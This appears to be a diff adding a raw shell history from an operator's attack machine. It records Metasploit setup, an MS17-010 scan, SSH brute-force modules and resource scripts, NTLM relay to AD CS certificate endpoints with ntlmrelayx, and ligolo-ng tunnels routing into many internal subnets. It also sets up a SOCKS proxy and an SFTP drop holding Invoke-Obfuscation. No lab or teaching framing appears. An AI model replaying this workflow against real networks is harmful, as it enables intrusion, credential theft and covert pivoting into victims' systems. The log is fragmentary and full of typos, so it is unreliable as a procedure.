@@ -1,0 +1,465 @@
+sudo apt install nano
+nano /etc/init.d/metasploit
+nano /etc/rc.local
+apt-get install screen
+screen
+use auxiliary/scanner/smb/smb_ms17_010
+auxiliary/scanner/smb/smb_ms17_010
+metasploit
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod +x msfinstall
+./msfinstall
+metasploit-framework
+head /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+wget http://fastandeasyhacking.com/download/armitage150813.tgz
+chmod +x metasploit-latest-linux-x64-installer.run (OR chmod +x metasploit-latest-linux-installer.run) (OR ./metasploit-latest-linux-installer.run OR ./metasploit-latest-linux-x64-installer.run)
+chmod +x metasploit-latest-linux-x64-installer.run
+chmod +x metasploit-4.13.0-2017022101-linux-x64-installer.run
+./metasploit-4.13.0-2017022101-linux-x64-installer.run
+wget http://downloads.metasploit.com/data/releases/archive/metasploit-4.13.0-2017022101-linux-x64-installer.run
+chmod +x metasploit-4.13.0-2017022101-linux-x64-installer.run
+./metasploit-4.13.0-2017022101-linux-x64-installer.run
+use auxiliary/scanner/smb/smb_ms17_010
+metasploit
+./metasploit-4.13.0-2017022101-linux-x64-installer.run
+metasploit
+head /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+msf
+use auxiliary/scanner/ssh/ssh_login
+ssh_login
+msf > use auxiliary/scanner/ssh/ssh_login
+tmux
+exit
+tmux attach -t 1
+tmux attach 1
+tmux attach -t 1
+msfconsole
+tmux
+tmux attach -t 1
+msfconsole
+tmux attach -t 0
+tmux
+msfconsole
+tmux attach -t 3
+tmux attach -t 2
+tmux attach -t 0
+tmux attach -t 1
+tmux attach -t 0
+tmux attach -t 1
+tmux attach -t 2
+tmux
+tmux attach -t 4
+tmux attach -t 2
+tmux attach -t 1
+
+apt-get update && apt-get upgrade
+apt-get update && apt-get upgrade
+msfconsole
+adsdads
+msfconsole
+exit
+tmux attach -t 1
+tmux
+tmux attach -t 0
+msfconsole
+tmux attach -t 1
+tmux
+tmux attach -t 0
+tmux
+tmux 2
+tmux
+$tmux
+tmux
+tmux
+tmux ls
+tmux attach -t 0
+tmux
+tmux attach -t 0
+tmux attach -t 1
+tmux attach -t 0
+tmux attach -t 1
+tmux attach -t 1
+tmux
+apt-get install default-jdk
+n
+wget http://fastandeasyhacking.com/download/armitage150813.tgz
+7z
+apt install p7zip-full
+apt-get install p7zip-full
+cd /home
+apt-get install p7zip-full
+apt install p7zip-full
+sudo apt-get install p7zip-full
+ps aux | grep -i apt
+apt_get update
+apt-get update
+apt-get upgrade
+ps aux | grep -i apt
+sudo killall apt apt-get
+sudo killall apt-get
+sudo kill 311000
+sudo kill 72508
+sudo kill 2036sudo kill 2036
+sudo kill 2036
+ps aux | grep -i apt
+apt-get install p7zip-full
+dpkg --configure -a
+apt-get install p7zip-full
+cd /root/-114
+7z l "*.7z" >> list5.txt
+exit
+msfconsole
+exit
+msfconsole
+tmux
+exi
+exit
+msfconsole
+tmux attach -t 4
+exit
+msfconsole
+exit
+msfconsole
+tmux
+exit
+tmux
+tmux attach -t 2
+tmux
+tmux attach -t 2
+tmux attach -t 1
+tmux attach -t 4
+tmux attach -t 1
+tmux attach -t 2
+tmux attach -t 0
+tmux
+tmux 
+tmux
+tmux attach -t 0
+msfconsole
+msfupdate
+msfconsole
+tmix
+tmux
+tmux 2
+tmjux
+tmux
+exit
+cd Allias
+recource https.rc
+resource https.rc
+resource http.tc
+resource http.rc
+resource https.rc
+exit
+cd Allias
+resource https.rc
+exit
+resource https.rc
+exit
+tmux attach -t
+tmux attach -t 1
+tmux attach -t 0
+tmux
+tmux attach -t 1
+tmux attach -t 1
+msfconsole
+tmux attach -t 1
+exit
+tmxu
+tmux
+tmux attach -t 1
+msfconsole
+tmux attach -t 1
+tmux
+msfconsole
+git clone git clone https://github.com/ExAndroidDev/impacket
+exitgit clone https://github.com/ExAndroidDev/impacket
+git clone https://github.com/ExAndroidDev/impacket
+cd impacket
+git switch ntlmrelayx-adcs-attack
+python3 -m pip install .
+python3 -m pip install
+ntlmrelayx.py -t http://10.10.34.11/certsrv/certfnsh.asp -smb2support --adcs
+python3 -m pip install .
+python3 -m install .
+python3 -m pip install .
+python
+python3
+ntlmrelayx.py -t http://10.10.34.11/certsrv/certfnsh.asp -smb2support --adcs
+python3 ntlmrelayx.py -t http://10.10.34.11/certsrv/certfnsh.asp -smb2support --adcs
+python3 ntlmrelayx_adsc.py -t http://10.10.34.11/certsrv/certfnsh.asp -smb2support --adcs
+pip
+apt install python3-pip
+git switch ntlmrelayx-adcs-attack
+python3 -m pip install .
+ntlmrelayx.py -t http://192.168.16.11/certsrv/certfnsh.asp -smb2support --adcs
+ntlmrelayx.py -t http://10.10.34.11/certsrv/certfnsh.asp -smb2support --adcs
+msfconsole
+exit
+msfconsole
+exit
+tmux attach t 1
+tmux attach -t 1
+tmux attach
+tmux
+msfconsole
+tmux
+exit
+cd impacket
+git switch ntlmrelayx-adcs-attack
+ntlmrelayx.py -t http://10.10.34.11/certsrv/certfnsh.asp -smb2support --adcs
+ntlmrelayx.py -t http://10.10.34.12/certsrv/certfnsh.asp -smb2support --adcs
+ntlmrelayx.py -t http://10.10.34.11/certsrv/certfnsh.asp -smb2support --adcs
+ntlmrelayx.py -t http://10.10.34.12/certsrv/certfnsh.asp -smb2support --adcs
+tmux attach -t 1
+tmux attach -t 1
+tmux 
+go build -o proxy cmd/proxy/main.go
+git clone https://github.com/tnpitsecurity/ligolo-ng/releases/download/v0.3.2/ligolo-ng_proxy_0.3.2_Linux_64bit.tar.gz
+copy https://github.com/tnpitsecurity/ligolo-ng/releases/download/v0.3.2/ligolo-ng_proxy_0.3.2_Linux_64bit.tar.gz
+https://github.com/tnpitsecurity/ligolo-ng/releases/download/v0.3.2/ligolo-ng_proxy_0.3.2_Linux_64bit.tar.gz
+wget https://github.com/tnpitsecurity/ligolo-ng/releases/download/v0.3.2/ligolo-ng_proxy_0.3.2_Linux_64bit.tar.gz
+tar -x ligolo-ng_proxy_0.3.2_Linux_64bit.tar.gz
+tar --extract ligolo-ng_proxy_0.3.2_Linux_64bit.tar.gz
+tar -xvf ligolo-ng_proxy_0.3.2_Linux_64bit.tar.gz
+./proxy
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+./proxy -h
+./proxy -selfcert
+ip route add 185.150.190.0/24 dev ligolo
+./proxy -selfcert
+reboot
+tmux new
+tmux new -s ostechnix -d
+ad
+msfconsole
+./proxy -selfcert
+./proxy -certself
+./proxy -selfcert
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+sudo ip route add 185.150.190.0/24 dev ligolo
+./proxy -selfcert
+reboot
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+ip route add 185.150.190.0/24 dev ligolo
+./proxy -selfcert
+ip route
+reboot
+wget http://ppa.launchpad.net/dajhorn/dante/ubuntu/pool/main/d/dante/dante-server_1.4.1-1_amd64.deb
+sudo apt-get install gdebi-core
+sudo gdebi dante-server_1.4.1-1_amd64.deb
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+ip route add 192.168.0.0/24 dev ligolo
+./proxy -selfcert
+apt update
+apt install dante-server
+dante - v
+dante -v
+danted -v
+nano /etc/init.d/danted
+chmod +x /etc/init.d/danted
+update-rc.d danted defaults
+systemctl status danted
+systemctl start danted
+systemctl status danted
+systemctl stop danted
+nano /etc/init.d/danted
+ip a
+nano /etc/danted.conf
+systemctl start danted
+systemctl status danted
+reboot
+systemctl start danted
+systemctl status danted
+reboot
+cat /etc/debian_version 
+uname -a
+apt update
+dpkg -l | grep dante
+cat /etc/danted.conf 
+systemctl status danted.service
+fg
+systemctl status danted.service
+vim /etc/danted.conf 
+ip address
+ls -l /dev/ | grep eth
+ls -l /dev/ | grep ens
+ls -l /dev/ 
+cat /etc/network/interfaces 
+cat /etc/network/if-up.d/ethtool 
+q
+ls -l /dev/ens3
+ip address
+cat /etc/netplan/00-installer-config.yaml 
+fg
+vim /etc/danted.conf 
+fg
+vim /etc/danted.conf 
+useradd -r -s /bin/false 12lky4hbhl9ry
+passwd 12lky4hbhl9ry
+vim /etc/danted.conf 
+service danted status
+service danted start
+service danted status
+tmux
+tmux -a -t 0
+tmux-a -t 0
+tmux a -t 0
+tmux a -t 0
+ip rotue
+ip route
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 192.168.1.0/24 dev ligolo
+./proxy -selfcert
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 192.168.1.0/24 dev ligolo
+./proxy -selfcert
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 192.168.1.0/24 dev ligolo
+./proxy -selfcert
+sudo ip route add 192.168.0.0/24 dev ligolo
+./proxy -selfcert
+sudo ip tuntap add user root mode tun ligolosudo ip tuntap add user root mode tun ligolosudo ip tuntap add user root mode tun ligolosudo ip tuntap add user root mode tun lig12
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+ip route
+sudo ip route add 192.168.2.0/24 dev ligolos
+sudo ip route add 192.168.2.0/24 dev ligolo
+sudo ip route add 172.16.236.0/24 dev ligolo
+sudo ip route add 172.16.240.0/24 dev ligolo
+sudo ip route add 172.16.238.0/24 dev ligolo
+sudo ip route add 192.168.6.0/24 dev ligolo
+sudo ip route add 192.168.5.0/24 dev ligolo
+sudo ip route add 172.16.242.0/24 dev ligolo
+sudo ip route add 172.16.27.0/24 dev ligolo
+./proxy -selfcert
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+ip route
+./proxy -selfcert
+ip route
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+ip route
+./proxy -selfcert
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+rebooy
+exit
+logout
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+ip route
+./proxy -selfcert
+tmux
+tmux a -t 1
+msfconsole
+tmux
+exit
+msfconsole
+exit
+msfconsole
+exit
+еьa
+tmux a -t 1
+tmux
+tmux a -t 0
+tmux
+sudo passwd crow
+users
+add users crow
+sudo useradd ligolo
+sudo passwd ligolo
+./proxy -selfcert
+sudo apt install openssh-server
+sudo groupadd sftpg
+sudo useradd -g sftpg crowsftp
+sudo passwd crowsftp
+sudo mkdir -p /data/crowsftp/upload
+sudo chown -R root.sftpg /data/crowxsftp
+sudo chown -R root.sftpg /data/crowsftp
+sudo chown -R crowsftp.sftpg /data/crowsftp/upload
+nano /etc/ssh/sshd_config
+sudo systemctl restart sshd
+sudo systemctl start sshd
+sudo systemctl sshd
+/data/
+crowsftp/
+ls
+home
+/root/data/
+userpass.txt
+nano userpass.txt
+/data/
+dir
+dir /data/
+dir /data/crowsftp/
+dir /data/crowsftp/upload/
+/data/crowsftp/upload/
+sudo systemctl restart sshd
+ls /data/crowsftp/upload/
+/data/crowsftp/upload/
+ls
+/data/crowsftp/upload/Invoke-Obfuscation.ps1
+/data/crowsftp/upload/Invoke-Obfuscation.ps
+/data/crowsftp/upload
+/data/crowsftp/upload/
+ls/data/crowsftp/upload/
+ls /data/crowsftp/upload/
+cd /data/crowsftp/upload
+ls
+cd /data/
+ls
+cd
+./proxy -selfcert
+exit
+logout
+./proxy -selfcert
+cd /grupojuritas/
+ls
+rm
+rm --help
+cd
+rm grupojuritas
+rm grupojuritas -f
+cd /grupojuritas
+ls
+cd
+rm -r grupojuritas
+rm -r /grupojuritas
+cd /grupojuritas
+cd grupojuritas
+ls
+./proxy -selfcert
+tmux
+tmux a -t 2
+msfconsole
+n]
+msfconsole
+TMux a -t 2
+tmux a -t 2
+tmux
+tmux a -t 3
+./proxy -selfcert
+tmux attach -t 3
+tmux a -t 3
+tmux a -t 3
+msfconsole
+resource https.rc
+cd Allias
+back
+exit
+tmux
